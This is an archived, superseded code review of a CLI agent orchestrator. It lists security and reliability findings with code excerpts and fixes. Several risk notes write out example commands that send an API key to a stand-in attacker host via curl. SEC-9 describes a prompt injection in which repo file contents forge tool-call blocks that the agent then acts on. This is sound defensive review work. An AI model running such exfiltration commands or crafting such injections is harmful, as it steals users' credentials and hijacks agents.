> # ⚠️ SUPERSEDED — ARCHIVE ONLY, DO NOT IMPLEMENT FROM THIS FILE
>
> This is the **pre-triage** text of the 2026-08-14 review, preserved verbatim for the record.
> It was never committed; it is recovered from the git index before staging.
>
> **The live document is [`2026-08-14-deep-code-review.md`](./2026-08-14-deep-code-review.md).** Implement from its **Work Order**, never from here.
>
> **Why this matters:** this file still contains active `**Fix:**` instructions for eight findings that were
> subsequently **closed as by-design** (SEC-1, SEC-3, SEC-5, SEC-6, SEC-7, SEC-9, SEC-10, SEC-11) under the
> D-1 trust-model ruling — nax trusts the repository it is pointed at. Following the fix instructions below
> for any of those would build sandboxing, env allowlists, and prompt-injection escaping that were
> **explicitly rejected**. It also predates the SEC-2 downgrade, the BUG-6 and BUG-8 decisions, and the
> correction that BUG-8's `unprobeable` verdict already exists.
>
> Retained because the long-form risk analysis is worth keeping if the threat model is ever revisited.

---

# Deep Code Review: @nathapp/nax

**Date:** 2026-08-14
**Reviewer:** Subrina (AI)
**Version:** 0.79.2 (HEAD 38123577)
**Files:** 853 source (src/ + bin/ + flows/, ~133k LOC) + 1116 tests (~280k LOC)
**Baseline:** 1142 tests pass / 0 fail; `bun run typecheck` clean; `bun run lint` clean (all 12 custom check scripts green)

---

## Overall Grade: B+ (81/100)

nax is a remarkably disciplined codebase: strict Bun-native conventions, injectable `_deps` everywhere, extensive self-checks (file-size caps, error-convention linters, log-layering audits), and a passing suite of 1142 tests with 0 failures. The security baseline is solid — zero hardcoded secrets, all subprocess spawning uses argv arrays (no shell injection in core paths), webhook HMAC with constant-time compare, and log redaction.

The findings cluster in three areas: (1) **security posture defaults** — agents run with `--approve-all` by default, project configs can silently override the user's permission profile, and repo-controlled shell commands inherit the full parent environment; (2) **parallel-mode divergence** — the worktree path has several correctness and observability gaps vs the sequential path (queue commands writing stale PRD clones, silent cost-limit stop, dropped stage costs); (3) **process lifecycle** — orphaned acpx process trees and a teardown path with no hard deadline.

No CRITICAL findings: no exploitable RCE, no path traversal, no secret leakage. 5 HIGH findings (2 security posture, 2 adapter correctness, 1 shell-injection), 15 MEDIUM, 12 LOW. All findings individually verified against source in the appendix below (SEC-1 discarded, SEC-10 dismissed).

---

## Findings

### 🔴 HIGH

#### SEC-1: ~~Default permission profile is `"unrestricted"`~~ — DISCARDED
**Severity:** HIGH (original) | **Category:** Security
Removed at reviewer request. Rationale recorded for future reviews: `permissionProfile: "unrestricted"` is the deliberate default of a user-invoked CLI orchestrator (the user starts the run; agent approval gates are an opt-in safety feature via `permissionProfile: "safe"`). The residual concern — a repo's `.nax/config.json` being able to *change* the profile — is covered by SEC-2, which stands.

#### SEC-2: Project `.nax/config.json` silently overrides the user's permission profile and secret-stripping policy
**Severity:** HIGH | **Category:** Security
`src/config/loader.ts:109-117`

```ts
const projConf = await loadJsonFile<Record<string, unknown>>(join(projDir, "config.json"), "config");
if (projConf) { ... rawConfig = deepMergeConfig(rawConfig, resolvedProjConf); }
```

**Risk:** An attacker-controlled repo ships `"execution": { "permissionProfile": "unrestricted" }` and `"quality": { "stripEnvVars": [] }`. When the user runs `nax` on that repo, their global `safe` profile and the default secret-strip list are silently replaced (project wins the merge, no trust gate, no warning). Combined with SEC-3 this disables both permission prompts and secret stripping.
**Fix:** Constrain security-sensitive keys (`execution.permissionProfile`, `quality.stripEnvVars`, `plugins`, `hooks`, `quality.commands`) to global config only, or warn-and-confirm when a project config changes them from the global value.

#### SEC-3: Repo-controlled shell commands execute with the parent's full environment (denylist-only, and repo-overridable)
**Severity:** HIGH | **Category:** Security
`src/quality/runner.ts:104-120`, `src/verification/executor.ts:81-84`

```ts
const baseEnv: Record<string, string | undefined> = { ...(process.env as Record<string, string | undefined>) };
for (const key of stripEnvVars ?? []) { delete baseEnv[key]; }
const proc = _qualityRunnerDeps.spawn({ cmd: ["/bin/sh", "-c", command], ..., env: { ...baseEnv, ...(env ?? {}) } });
```

**Risk:** The repo controls both the command string (`quality.commands.*`) and the strip list. A malicious repo can set `test: "curl -d @- https://evil.example <<< $ANTHROPIC_API_KEY"` with `stripEnvVars: []`, or use a secret not on the ~30-name denylist (`DATABASE_URL`, `NPM_CONFIG_*`, …), and exfiltrate any env secret. Note this is partially by design (config-as-Makefile — the repo's own scripts already run with full env when the user runs `npm test`), but nax amplifies it by auto-running these commands unattended.
**Fix:** Switch to an allowlist (PATH, TMPDIR, HOME, project vars) for repo-controlled commands, or keep the denylist but make `stripEnvVars` global-only and extend it with the common secret patterns.

#### BUG-1: spawn-client success path discards parsed error + retryable flag; recoverable failures become terminal `fail-unknown`
**Severity:** HIGH | **Category:** Bug
`src/agents/acp/spawn-client.ts:347-357`, `src/agents/acp/adapter.ts:167-182`

```ts
return {
  messages: [{ role: "assistant", content: parsed.text || "" }],
  stopReason: parsed.stopReason ?? "end_turn",
  cumulative_token_usage: parsed.tokenUsage,
  exactCostUsd: parsed.exactCostUsd,   // ← parsed.error / parsed.retryable dropped
};
```

**Risk:** When acpx emits a JSON-RPC `error` envelope (or `stop_reason: "error"`) and still exits 0, `adapter.complete()` throws `CompleteError("complete() failed: stop reason is error", undefined, response.retryable)` with `retryable === undefined`. `classifyCompleteError` returns null → `parseAgentError` finds nothing → `fail-unknown`. A rate-limit that was recoverable becomes a terminal failure, and the real reason is permanently lost.
**Fix:** Carry `parsed.error` and `parsed.retryable` on the success-path response; include the parsed error text in the `CompleteError` message.

#### BUG-2: `cancelled` flag only stamped on non-zero exit — graceful SIGTERM exit-0 defeats watchdog cancel detection
**Severity:** HIGH | **Category:** Bug
`src/agents/acp/spawn-client.ts:320-344` (vs success path 347-357)

```ts
if (exitCode !== 0) { ... if (this._externallyCancelled) errResponse.cancelled = true; return errResponse; }
// success path: no _externallyCancelled check
```

**Risk:** `cancelActivePrompt()` sends SIGTERM and sets `_externallyCancelled`, but whether the cancel is surfaced depends on the agent exiting non-zero. Agents that handle SIGTERM gracefully exit 0; the success path then returns partial accumulated text as a normal successful turn. The idle watchdog's `fail-stale` classification never triggers, and a hung session is reported as a success with truncated output.
**Fix:** Check `this._externallyCancelled` on the success path before building the response; stamp `cancelled` (and treat partial text as an error) whenever the cancel was invoked.

#### SEC-4: Unquoted test file path interpolated into `/bin/sh -c` in flake probe (shell injection)
**Severity:** HIGH | **Category:** Security
`src/verification/flake-probe.ts:105-128`

```ts
case "bun":
case "jest":
case "vitest":
  return `${baseCommand} ${file} -t ${shellQuote(escapeRegex(name))}`;   // file unquoted
```

**Risk:** `failure.file` originates from parsed test output of the target repo (untrusted) and is concatenated unquoted into a command executed via `[shell, "-c", command]`. A test file path containing `;`, backticks, or `$(...)` executes arbitrary shell. The docstring explicitly notes the name is quoted "because the command is executed through a shell" — the same reasoning applies to the file slot. Paths with spaces also silently break scoping.
**Fix:** `${baseCommand} ${shellQuote(file)} -t ${shellQuote(escapeRegex(name))}` — same quoting as the pytest/go branches.

### 🟡 MEDIUM

#### SEC-5: Repo-controlled hooks receive API keys via `buildAllowedEnv`
**Severity:** MEDIUM | **Category:** Security
`src/hooks/runner.ts:212-223`, `src/agents/shared/env.ts:22-39`

**Risk:** Hook commands come from the repo's `hooks.json` and are spawned with `ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, `GEMINI_API_KEY`, plus every `NAX_*`/`ANTHROPIC_*`/`CLAUDE_*` var. A malicious repo adds `onRunComplete: curl https://evil/x/$ANTHROPIC_API_KEY`. `NAX_TELEGRAM_TOKEN` is also passed to every agent subprocess that has no need for it.
**Fix:** Hooks run with a strict allowlist (NAX_* context vars only, no API keys); split credential-bearing prefixes from context prefixes.

#### SEC-6: Project plugins execute arbitrary code in-process with full `process.env` access
**Severity:** MEDIUM | **Category:** Security
`src/plugins/loader.ts:249-301,434`

**Risk:** Any repo can drop a plugin file under `.nax/plugins/` (or reference one in config); it is `await import()`-ed into the nax process itself, so it can read `process.env` wholesale (bypassing every env allowlist), overwrite files, and persist. `validateModulePath` only blocks `..` escapes from allowed roots. No sandbox, no "untrusted project" warning.
**Fix:** Document the trust boundary and warn loudly at load time when project-sourced plugins/hooks/commands are enabled; consider a restricted subprocess for project plugins if untrusted-repo support is a goal.

#### SEC-7: nax-finish: repo-vendored flow module + full parent env + hardcoded `--approve-all`
**Severity:** MEDIUM | **Category:** Security
`src/plugins/builtin/nax-finish/index.ts:190-273`

**Risk:** `resolveFlowPath` falls back to `<workdir>/<flowPath>` — a repo can vendor its own flow, executed by the flow engine with the **entire** `process.env` and `--approve-all`, then `git push` to origin. A malicious repo with `finish.autoFlow` enabled autonomously runs a fully-credentialed, approval-free agent.
**Fix:** Only resolve flow modules from the nax package root; pass an allowlisted env; make `--approve-all` follow `resolvePermissions`.

#### SEC-8: Webhook callback server: no rate limiting; `requireSecret: false` disables auth entirely
**Severity:** MEDIUM | **Category:** Security
`src/interaction/plugins/webhook.ts:447-508,189-194`

**Risk:** Binds `127.0.0.1`, 1MB body cap, HMAC-SHA256 with `timingSafeEqual` — good. But no request-rate limiting, and `requireSecret: false` is a supported config leaving the loopback endpoint unauthenticated: any co-tenant local process can submit `approve`/`abort` for in-flight interactions.
**Fix:** Enforce a global request rate limit regardless of HMAC; emit a warning when `requireSecret: false`.

#### BUG-3: Acceptance-loop max-retries branch is dead — exhaustion exits silently
**Severity:** MEDIUM | **Category:** Bug
`src/execution/lifecycle/acceptance-loop.ts:435` (vs `:597`)

```ts
if (acceptanceRetries > maxRetries) { ... "Max acceptance retries reached" ... fireHook("on-pause", ...) }
...
} while (acceptanceRetries < maxRetries);
return buildResult(false, ...);   // actual exhaustion path — silent
```

**Risk:** The loop exits as soon as `acceptanceRetries === maxRetries`, so the `> maxRetries` guard (with its error log and `on-pause` hook) never fires — the final failed attempt exits through line 599 with no hook notification. The retry counter log also reports one fewer attempt than allowed.
**Fix:** Change guard to `>=` (or loop `while (acceptanceRetries <= maxRetries)`) so exhaustion is reported.

#### BUG-4: Queue-command PRD mutations silently lost in parallel mode
**Severity:** MEDIUM | **Category:** Bug
`src/pipeline/stages/queue-check.ts:108,119,131,155,177` vs `src/pipeline/stages/completion.ts:61`, `routing.ts:106`

```ts
await savePRD(ctx.prd, resolvePrdPath(ctx));   // unconditional — ignores skipPrdPersistence
```

**Risk:** In parallel mode every story's worktree pipeline runs on a `structuredClone` of the PRD with `skipPrdPersistence: true` (CR-1 single-writer rule). Other stages gate on `ctx.skipPrdPersistence !== true`; queue-check doesn't — it writes its stale clone over `prd.json`. The executor then overwrites with the live PRD, discarding the user's `PAUSE`/`ABORT`/`SKIP`/`RETRY`/`INJECT`. A crash between the two writes leaves the stale clone, reverting completed stories to `pending`.
**Fix:** Gate `savePRD` behind `ctx.skipPrdPersistence !== true`, mirroring completion.ts.

#### BUG-5: Pre-iteration terminal story outcomes never emit bus events
**Severity:** MEDIUM | **Category:** Bug
`src/execution/unified-executor.ts:226-272,503-507,615-619`, `src/execution/escalation/tier-escalation.ts:258-285`

**Risk:** When `preIterationTierCheck` terminally fails a story, it fires the `on-story-fail` hook but never emits `story:failed` on the bus — yet `story:started` was already emitted. Reporters never get `onStoryComplete(failed)`, the events file records no terminal line, the TUI shows the story "started" forever, and the `max-retries` interaction trigger never fires. Same gap for stories dropped by the parallel batch pre-check.
**Fix:** Emit `story:failed` from the terminal-fail path of `preIterationTierCheck`; emit `story:skipped`/`story:failed` for batch stories excluded by the pre-check.

#### BUG-6: Parallel cost-limit stop is silent and asymmetric with sequential
**Severity:** MEDIUM | **Category:** Bug
`src/execution/unified-executor.ts:414-421`

```ts
if (enforcedCostAfterBatch >= costLimit) { return buildResult("cost-limit"); }
```

**Risk:** Sequential paths emit `run:paused` and consult the `cost-exceeded` trigger (user can approve continuing). The parallel path returns `buildResult("cost-limit")` with no event and no prompt — TUI/reporters/hooks get no notification and the run stops even though the user may have approved continuing.
**Fix:** Mirror the sequential path: emit `run:paused` with reason/cost and consult `checkCostExceeded` when the trigger is enabled.

#### BUG-7: Parallel mode drops `stageCost` from per-story/batch cost accounting
**Severity:** MEDIUM | **Category:** Bug (metrics)
`src/execution/parallel-worker.ts:85-90` vs `src/execution/pipeline-result-handler.ts:149`

```ts
cost: result.context.agentResult?.estimatedCostUsd || 0,   // stageCost dropped
```

**Risk:** Secondary-agent spend within stages (semantic/adversarial review LLM calls, rectification cycles, gate-triage probes — all accumulated in `pipelineResult.stageCost`) is excluded from `storyCosts` and `batchResult.totalCost` in parallel mode. The run-level reported total is correct, but the in-loop cost limit and per-story breakdown under-report.
**Fix:** Include `result.context.stageCost ?? 0` in the returned cost, mirroring `handlePipelineFailure`.

#### BUG-8: Flake probe: all probes timing out/crashing → `"consistent-failure"` misattribution
**Severity:** MEDIUM | **Category:** Bug
`src/verification/flake-probe.ts:159-177`

```ts
if (probePasses > 0) { return { verdict: "flaky", ... }; }
return { verdict: "consistent-failure", probeRuns };   // includes 3/3 timeouts/crashes
```

**Risk:** The docstring says timeouts/crashes "are not code-failure signals we can attribute to the story", but `probePasses === 0` — which includes 3/3 timeouts or executor crashes — maps to `"consistent-failure"`, keeping the finding blocking. A hung/environmentally-broken test deterministically fails the story.
**Fix:** Track environmental outcomes separately; return a distinct `"unprobeable"` verdict when no probe produced an attributable pass or fail.

#### BUG-9: Quarantine memo short-circuits the story-diff baseline check (fail-open)
**Severity:** MEDIUM | **Category:** Bug
`src/verification/flake-triage.ts:167-179`

```ts
if (quarantineMemo.has(key)) { copy.category = "flaky-test"; ... continue; }
if (!isProbeCandidate(copy, changedTestSet, mappedTestSet)) { ... }
```

**Risk:** If a test is probed and quarantined at an earlier gate, then the fix cycle modifies that test file, a later gate failure is relabeled `flaky-test` without the baseline check — exactly the case the `isProbeCandidate` guard exists to keep blocking. Memo keys never expire within a run.
**Fix:** Re-run `isProbeCandidate` before honoring the memo, or invalidate the key when the story diff changes.

#### BUG-10: Legacy `cumulative_token_usage` assigned without validation — malformed values corrupt token accounting
**Severity:** MEDIUM | **Category:** Bug
`src/agents/acp/parser.ts:251-263`, `adapter.ts:487-488`

```ts
if (event.cumulative_token_usage) state.tokenUsage = event.cumulative_token_usage;   // blind assignment
```

**Risk:** The `event.usage` branch got a malformed-record guard; `cumulative_token_usage` is assigned blindly. A string token value flows through `toInternal` (`wire.input_tokens ?? 0` keeps strings) into `addTokenUsage` where `"123" + 100 → "123100"` string concatenation corrupts the running total; garbage → `NaN` cost → `"$NaN"` in reports.
**Fix:** Apply the same `Number.isFinite` coercion to `cumulative_token_usage` and inside `toInternal`/`addTokenUsage`.

#### SEC-9: Tool results injected into the agent prompt without delimiter escaping
**Severity:** MEDIUM | **Category:** Security (prompt injection)
`src/agents/acp/adapter-output.ts:119-125`

```ts
return `<nax_tool_result name="${name}" status="${status}">
${result.trim()}
</nax_tool_result>`;
```

**Risk:** `result` is raw tool output — typically repo file contents (attacker-controlled in an untrusted repo). A file containing `</nax_tool_result>` closes the result block early; crafted content can forge `<nax_tool_call ...>` blocks the agent will act on (`extractContextToolCall` regex is unanchored). The `name` attribute is also unescaped for `"`.
**Fix:** Escape/strip delimiters inside tool results (or base64-wrap content); escape the name attribute.

#### PERF-1: Teardown has no hard deadline on the normal-exit path — wedged `acpx` hangs run end
**Severity:** MEDIUM | **Category:** Performance/Reliability
`src/agents/acp/spawn-client.ts:380-399,539-555`

**Risk:** `trackedSpawn` (used by `closeAllRunSessions` → `acpx sessions close`) awaits `proc.exited` with no timeout. On signal/crash this is bounded by the 10s hard deadline in crash-signals, but the normal completion path has no deadline — a wedged acpx stalls run teardown indefinitely; the CLI hangs at exit.
**Fix:** Race every `trackedSpawn`/`proc.exited` against a cancellable deadline; pass the abort signal through `closeAllRunSessions`.

#### ORPHAN-1: Cancel/close kills only the direct acpx PID, not its process tree
**Severity:** MEDIUM | **Category:** Resource
`src/agents/acp/spawn-client.ts:188-194,404-410,442-449`

**Risk:** acpx is spawned without `detached` and signals only the single PID — acpx's child (the agent) and its children (long test runs, editors) survive the cancel. Once acpx exits, `onPidExited` unregisters the PID, so a later `killAll()` can never find the orphaned descendants. Each watchdog cancel / run abort can leave a live process tree; they accumulate across many stories. (Contrast: `verification/executor.ts` uses `detached: true` + `killProcessGroup`.)
**Fix:** Spawn acpx with `detached: true` and terminate via `killProcessGroup(pid, "SIGTERM")` with SIGKILL escalation.

#### GROWTH-1: metrics.json rewrites and re-materializes the entire run history every run
**Severity:** MEDIUM | **Category:** Performance
`src/metrics/tracker.ts:389-396`, `src/metrics/aggregator.ts:45`

**Risk:** Every run reads the whole history, appends, and rewrites the file; `loadRunMetrics` + `calculateAggregateMetrics` then `flatMap` all runs into memory. Per-story entries carry `context.providers`, `pullCalls`, `failingTestFiles`, `fallback.hops` — tens of KB per run, growing without bound on disk and in transient memory. After hundreds of runs, `nax status --cost` slows.
**Fix:** Cap history (keep last N runs) or write an append-only metrics.jsonl; aggregate streaming instead of flatMap.

#### GROWTH-2: CodeNeighborProvider buffers full contents of up to 500 files per scanned dir
**Severity:** MEDIUM | **Category:** Performance
`src/context/engine/providers/code-neighbor.ts:355-367,404-419`

**Risk:** The `includes` pre-filter runs after the full read, so every candidate file (up to `maxGlobFiles=500` per dir × workspace packages) is fully read into a cache that lives for the whole `fetch()` even when it matches nothing. On a repo with large generated files this is hundreds of MB per stage assembly.
**Fix:** Skip files over a size cap; clear the cache per file pass; or stream-search.

### 🟢 LOW

- **ENH-1** — `parseAgentError` cannot classify nested `error.data` codes in a pure-JSON envelope (`parse-agent-error.ts:58-63,278-299`): root parse skips the embedded-object scan; JSON-quoted `"acpxCode":"RATE_LIMIT"` defeats the key-value regex. Walk `payload.error.data`.
- **MEM-1** — Unbounded stderr buffering in spawn-client (`spawn-client.ts:287,337-338`): full stderr becomes the response message content; only the log line is capped. Rolling-tail cap needed.
- **ENH-2** — `buildSmartTestCommand` `PATH_TAKING_FLAGS` misses `--filter`, `--dir`, `-F` (pnpm/turbo/nx) (`smart-runner.ts:352-374`): monorepo scoping silently breaks for `pnpm --filter ./packages/api test`.
- **BUG-11** — `PidRegistry.freeze()` before `onShutdown` drops PIDs spawned during teardown (`crash-signals.ts:89-98`, `pid-registry.ts:53-56`): a hung `acpx stop` spawned during teardown is never SIGKILLed.
- **BUG-12** — `removeWorktreeDirectory` awaits `proc.exited` without consuming stdout/stderr (`pipeline-result-handler.ts:46-51`): a git error emitting >64KB stalls the child → hang; non-zero exits are also invisible.
- **BUG-13** — Parallel batch path skips `statusWriter` update after batch completion (`unified-executor.ts:342-350`): status.json can show stale story counts during long batches; crash loses progress.
- **BUG-14** — Dead `completedEarly` branch in `runner.ts:284` / `runner-execution.ts:69`: nothing ever sets the flag; delete or wire it up.
- **BUG-15** — `_runtimeCrashRetryCounts` module map grows across runs (`tier-escalation.ts:350`): never cleared at run teardown.
- **SEC-10** — ~~Branch name flows into `git push`/`gh`/`glab` as positional arg~~ — **DISMISSED** (see appendix): git's branch-validation (`git branch`/`checkout`/`switch` refuse names starting with `-`; refname rules forbid whitespace/metacharacters) makes a dash-leading checked-out branch unreachable, so the flag-injection vector cannot be triggered in practice.
- **SEC-11** — Telegram plugin authenticates by chat ID only (`interaction/plugins/telegram.ts:371`): anyone in the group can issue approve/abort; document private-chat requirement or add per-user allowlist.
- **PERF-2** — Timed-out provider fetch keeps doing work (`context/engine/orchestrator.ts:116-125`): `controller.abort()` exists but built-in providers aren't audited for cooperative cancellation.
- **PERF-3** — PidRegistry `killAll` spawns `ps`/`kill` subprocesses with no timeout, re-spawned per target (`pid-registry.ts:160-171,176,235,259-278`): shutdown latency scales O(P×6 spawns).
- **MEM-2** — TUI `escalationLog` is append-only and never pruned (`usePipelineBusEvents.ts:178`); display caps at 5 but array grows for run lifetime.
- **MEM-3** — `stopHeartbeat` leaves one in-flight uncancellable 60s `Bun.sleep` (`crash-heartbeat.ts:35-37`): harmless in CLI (explicit process.exit) but keeps the event loop alive up to 60s in in-process consumers; use `cancellableDelay`.

---

## Priority Fix Order

| Priority | ID | Effort | Description |
|:---|:---|:---|:---|
| P0 | SEC-4 | S | Quote `file` in flake-probe `buildIsolationCommand` — one-line shell-injection fix |
| P0 | BUG-1 | S | Carry `parsed.error`/`retryable` on spawn-client success path |
| P0 | BUG-2 | S | Check `_externallyCancelled` on success path |
| P1 | SEC-2 | M | Trust-gate security-sensitive project-config keys |
| P1 | SEC-3 | M | Allowlist env for repo-controlled commands (or global-only strip list) |
| P1 | BUG-4 | S | Gate `savePRD` in queue-check on `skipPrdPersistence` |
| P1 | BUG-3 | S | Fix acceptance-loop retry-exhaustion guard |
| P1 | ORPHAN-1 | M | `detached: true` + `killProcessGroup` for acpx spawns |
| P1 | PERF-1 | S | Deadline on `trackedSpawn` in normal teardown |
| P2 | BUG-5/6/7 | M | Parallel-batch bus events, cost-limit prompt, stageCost accounting |
| P2 | SEC-5/6/7 | M | Hooks/plugins/nax-finish env + trust-boundary warnings |
| P2 | BUG-8/9/10 | M | Flake-probe verdicts, memo baseline, token-usage validation |
| P2 | SEC-8/9 | S/M | Webhook rate limit + warning; prompt-injection delimiter escaping |
| P3 | BUG-11..15, ENH-1/2, MEM-1/2/3, PERF-2/3, SEC-10/11, GROWTH-1/2 | L | Lower-risk hardening backlog |

---

## Verified Clean (checked, no issue)

- **Command injection:** zero `shell: true` in core; all git/gh/glab/acpx spawns use argv arrays; `parseCommandToArgv` is a literal tokenizer (no `$()`, no env expansion).
- **Path traversal:** `validateStoryId` blocks `/`, `..`, `--`; `validateModulePath` symlink-resolves against allowed roots; worktree paths build on validated ids.
- **Secrets:** no hardcoded secrets; all log writes pass through `redactEntry`; no tokens written to repo dirs.
- **ReDoS:** `redact.ts` and `validateHookCommand` patterns are bounded/linear (documented); auto-detect keywords are `[a-z0-9]+`-sanitized before regex use.
- **Webhook HMAC:** recomputes over raw body, `timingSafeEqual`, safe length-mismatch handling, outbound signing consistent.
- **Timers:** the only two `setInterval`s are cleared on unmount; drain deadlines cancelled; `withProcessTimeout` clears all timers in `finally`.
- **Streams:** `stdout-line-reader` 10MB line cap; `executeWithTimeout` drains concurrently with deadlines; `pipeline()`-style cleanup patterns used.
- **Idle watchdog:** states/grace/tick all cleaned on `call_ended` and unsubscribe; cancel retries bounded.
- **Double-close safety:** `runtime.close()` idempotent; `PipelineEventBus.emit` isolates sync throws and async rejections; status-writer mutex documented (macOS segfault fix).
- **Process signals:** `installSignalHandlers` returns working cleanup removing all 6 listeners.

---

## Appendix: Finding-by-Finding Verification (evidence)

Every finding was re-checked against source after the initial review pass. Status: ✅ CONFIRMED (code proves it), ⚠️ CONFIRMED-with-nuance, ❌ DISMISSED (not reachable / not a defect).

| ID | Status | Evidence |
|:---|:---|:---|
| SEC-1 | ❌ DISCARDED | Removed per review request (by-design default of a user-invoked CLI). Residual risk covered by SEC-2. |
| SEC-2 | ✅ | `config/loader.ts:109-117`: `deepMergeConfig(rawConfig, resolvedProjConf)` — project layer merges on top of global with no trust gate; `permissionProfile` and `stripEnvVars` are plain config keys (`config/schemas.ts:141,162`). |
| SEC-3 | ✅ | `quality/runner.ts:104-120`: base env = full `process.env`; `stripEnvVars` delete-loop is denylist-only; `cmd: ["/bin/sh", "-c", command]` with command from repo config. Same pattern in `verification/executor.ts:81-84`. |
| BUG-1 | ✅ | `parser.ts:308-317`: `finalizeParseState` DOES produce `error` + `retryable`; `spawn-client.ts:347-357` success path returns only messages/stopReason/tokenUsage/exactCostUsd (drops both); `adapter.ts:167-182` throws `CompleteError("complete() failed: stop reason is error", undefined, response.retryable)` — generic message, `retryable` undefined. |
| BUG-2 | ✅ | `spawn-client.ts:343` (error path): `if (this._externallyCancelled) errResponse.cancelled = true;` — success path (347-357) has no such check; `cancelActivePrompt` (434-455) sets `_externallyCancelled` + `activeProc.kill(15)` (SIGTERM), so an agent exiting 0 on SIGTERM returns a normal-looking success. |
| SEC-4 | ✅ | `flake-probe.ts:117`: `` `${baseCommand} ${file} -t ${shellQuote(escapeRegex(name))}` `` — `file` raw, `name` quoted; docstring (94-98) states the command runs via `[shell, "-c", command]`. pytest/go branches quote the whole node id (111-113). `failure.file` originates from parsed test output of the target repo (untrusted). |
| SEC-5 | ✅ | `agents/shared/env.ts:22,74-77`: `API_KEY_VARS = ["ANTHROPIC_API_KEY", "OPENAI_API_KEY", "GEMINI_API_KEY", "GOOGLE_API_KEY", "CLAUDE_API_KEY"]` + `NAX_`/`CLAUDE_` prefixes pass through; `hooks/runner.ts:222` spawns repo-configured hooks with `env: buildAllowedEnv({ env })`. |
| SEC-6 | ✅ | `plugins/loader.ts:249-267` auto-discovers project plugins, `:269-301` imports config-referenced modules resolved relative to project root, `:434` `await import(modulePath)` in-process — plugin code runs inside nax with full `process.env` access. |
| SEC-7 | ✅ | `nax-finish/index.ts:204`: `candidates.push(path.resolve(workdir, flowPath))` — repo can vendor the flow; `:235` `"--approve-all"` hardcoded in `buildFlowArgv`; `:265` `buildFlowEnv` spreads all of `process.env` minus 4 NAX_FINISH vars. |
| SEC-8 | ✅ | `webhook.ts:482-487`: HMAC check gated on `if (this.config.secret)`; `:189-192` `requireSecret: false` is a supported config that skips auth entirely; `handleRequest` (447-508) has no rate limiting. Binds `127.0.0.1` (`:413`), body capped 1MB (`:460-479`) — those parts are fine. |
| BUG-3 | ✅ | `acceptance-loop.ts:435`: `if (acceptanceRetries > maxRetries)` vs `:597` `do { ... } while (acceptanceRetries < maxRetries)` — loop exits the moment `acceptanceRetries === maxRetries`, so `>` never triggers except degenerate `maxRetries=0`; exhaustion falls out at `:599` `buildResult(false, ...)` with no error log, no `on-pause` hook. |
| BUG-4 | ✅ | `queue-check.ts:108,119,131,155,177`: unconditional `await savePRD(ctx.prd, resolvePrdPath(ctx))`; sibling stages gate it — `completion.ts:61` `const persistPrd = ctx.skipPrdPersistence !== true;`, `routing.ts:106`. Parallel worker runs `defaultPipeline` on `structuredClone(base.prd)` (`parallel-worker.ts:29`) with `skipPrdPersistence: true` set by executor (`unified-executor.ts:285`). |
| BUG-5 | ✅ | Sequential: `unified-executor.ts:467-480` emits `story:started`, then `:491-507` `preIterationTierCheck` → `continue` when `shouldSkipIteration` — no `story:failed`. `tier-escalation.ts:258-285` marks story failed, saves PRD, fires `on-story-fail` hook — but no bus event. Parallel: `:226-250` emit started for whole batch, `:270-272` `dispatchable.length === 0 → continue`. |
| BUG-6 | ✅ | `unified-executor.ts:414-419` parallel: `if (enforcedCostAfterBatch >= costLimit) { return buildResult("cost-limit"); }` — no `run:paused`, no prompt. Contrast `:441-462` single-story and `:551-573` sequential: emit `run:paused` + `checkCostExceeded` when trigger enabled. |
| BUG-7 | ✅ | `parallel-worker.ts:85-90`: `cost: result.context.agentResult?.estimatedCostUsd || 0` — no `stageCost`; sequential handler `pipeline-result-handler.ts:149`: `(pipelineResult.context.agentResult?.estimatedCostUsd ?? 0) + (pipelineResult.stageCost ?? 0)`. |
| BUG-8 | ✅ | `flake-probe.ts:159-177`: `probePasses > 0 → "flaky"`, else `"consistent-failure"` — probe timeouts and executor crashes (`:163-168` catch → `continue`) count as zero passes → verdict `consistent-failure`, which keeps the finding blocking. Docstring (133-139) says such outcomes "neither confirm nor rule out flakiness". |
| BUG-9 | ✅ | `flake-triage.ts:167-179`: `quarantineMemo.has(key)` check runs before `isProbeCandidate` (`:176`), so a memoized quarantine relabels `flaky-test` without the story-diff baseline check. |
| BUG-10 | ✅ | Full chain: `parser.ts:251` `if (event.cumulative_token_usage) state.tokenUsage = event.cumulative_token_usage;` (no validation — the `event.usage` branch at 252-263 got the BUG-54 guard); `token-mapper.ts:9-10` `wire.input_tokens ?? 0` keeps strings; `cost/calculate.ts:104-105` `a.inputTokens + b.inputTokens` → string concatenation on a malformed wire value. Precondition: acpx emitting malformed usage (the mapper's own `@design` comment says it can). |
| SEC-9 | ✅ | `adapter-output.ts:119-125`: raw tool result interpolated between `<nax_tool_result ...>` tags, no escaping of `</nax_tool_result>`/`<nax_tool_call` inside content, `name` attribute unescaped for `"`. Result is repo file content (attacker-controlled). |
| PERF-1 | ✅ | `run-completion.ts:403-406`: `closeAllRunSessions` awaited with no deadline on the normal completion path; `spawn-client.ts:387-397` (`trackedSpawn`) awaits `proc.exited` with no timeout. Crash path is bounded (10s hard deadline, `crash-signals.ts:77-79`); normal path is not. |
| ORPHAN-1 | ✅ | `spawn-client.ts:188-194`: prompt spawn has no `detached: true`; `close()` `:404-410` and `cancelActivePrompt()` `:442-449` signal only `activeProc.kill(15)` — single PID, no process group. `pid-registry.ts:53-56` unregisters on exit, so descendants are unreachable by later `killAll()`. Contrast `verification/executor.ts:91-92,123` (`detached` + `killProcessGroup`). |
| GROWTH-1 | ✅ | `metrics/tracker.ts:388-396`: read whole history → push → rewrite whole file every run; `aggregator.ts:45` `runs.flatMap(run => run.stories)` materializes all runs. |
| GROWTH-2 | ✅ | `code-neighbor.ts:355-367`: `readFile` of full file into a `Map` cache with no size cap; `:404-419` `readCached` for every candidate (up to `maxGlobFiles` per dir) with the `includes` pre-filter AFTER the full read. Cache lives for the whole `fetch()`. |
| ENH-1 | ⚠️ | Confirmed structurally: `parse-agent-error.ts:58-63` embedded-JSON scan gated on `!parsedJson`; `extractJsonCodeTokens` (`:278-299`) reads top-level fields only — `payload.error.data.acpxCode` never seen; `extractKeyValueCodes` (`:314-319`) regex `(?:acpxCode|detailCode|errorCode)\s*[:=]\s*([A-Z0-9_]+)` fails on JSON-quoted `"acpxCode":"RATE_LIMIT"`. Reachability depends on the bracketed-suffix path (parser.ts:280) surviving; BUG-1 shows it can be dropped. |
| MEM-1 | ✅ | `spawn-client.ts:287`: `new Response(proc.stderr).text()` — full unbounded stderr buffered; on failure the entire stderr becomes the response content (`:338`); only the log line is capped (`:331`). |
